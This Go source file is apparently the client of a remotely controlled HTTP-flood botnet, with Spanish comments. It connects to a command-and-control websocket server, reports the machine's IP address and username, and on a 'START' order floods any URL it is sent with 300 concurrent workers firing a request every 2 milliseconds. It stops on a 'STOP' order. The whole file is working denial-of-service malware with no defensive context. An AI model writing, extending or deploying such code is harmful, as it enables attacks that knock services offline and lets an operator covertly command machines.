package main

import (
	"context"
	"io"
	"net"
	"net/http"
	"os"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

type ClientInfo struct {
	IP       string `json:"ip"`
	MAC      string `json:"mac"`
	Username string `json:"username"`
}

var (
	CENTRALITA_IP = "ws://192.168.1.54:8080/ws"
	cancelFunc    context.CancelFunc

	// cosas de intensidad

	concurrencia = 300
)

func StressConnections(ctx context.Context, url string, concurrency int) {
	tr := &http.Transport{
		MaxIdleConns:        concurrency * 2,
		MaxIdleConnsPerHost: concurrency,
		DisableKeepAlives:   false,
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   5 * time.Second,
	}

	var wg sync.WaitGroup

	worker := func() {
		defer wg.Done()

		ticker := time.NewTicker(2 * time.Millisecond) // esto hace agresividad
		defer ticker.Stop()

		for {
			select {
			case <-ctx.Done():
				return

			case <-ticker.C:
				resp, err := client.Get(url)
				if err == nil {
					io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
				}
			}
		}
	}

	wg.Add(concurrency)
	for i := 0; i < concurrency; i++ {
		go worker()
	}

	wg.Wait()
}

func getLocalIP() string {
	addrs, _ := net.InterfaceAddrs()
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			return ipnet.IP.String()
		}
	}
	return "unknown"
}

func main() {

	wsURL := CENTRALITA_IP

	for {
		conn, _, err := websocket.DefaultDialer.Dial(wsURL, nil)
		if err != nil {
			time.Sleep(10 * time.Second)
			continue
		}

		info := ClientInfo{
			IP: getLocalIP(),
			// TODO: añadir lo de la mac
			MAC:      "00:11:22:33:44:55",
			Username: os.Getenv("USER"),
		}
		conn.WriteJSON(info)

		for {
			var msg map[string]string
			if err := conn.ReadJSON(&msg); err != nil {
				if cancelFunc != nil {
					cancelFunc()
				}
				conn.Close()
				break
			}

			// =======================
			// 	aqui van las ordenes que se pueden recibir de la centralita
			switch msg["action"] {
			case "START":
				if cancelFunc != nil {cancelFunc()}

				ctx, cancel := context.WithCancel(context.Background())
				cancelFunc = cancel

				go StressConnections(ctx, msg["payload"], concurrencia) // ajusta concurrencia aquí

			case "STOP":
				if cancelFunc != nil {
					cancelFunc()
					cancelFunc = nil
				}
			}
		}
	}
}
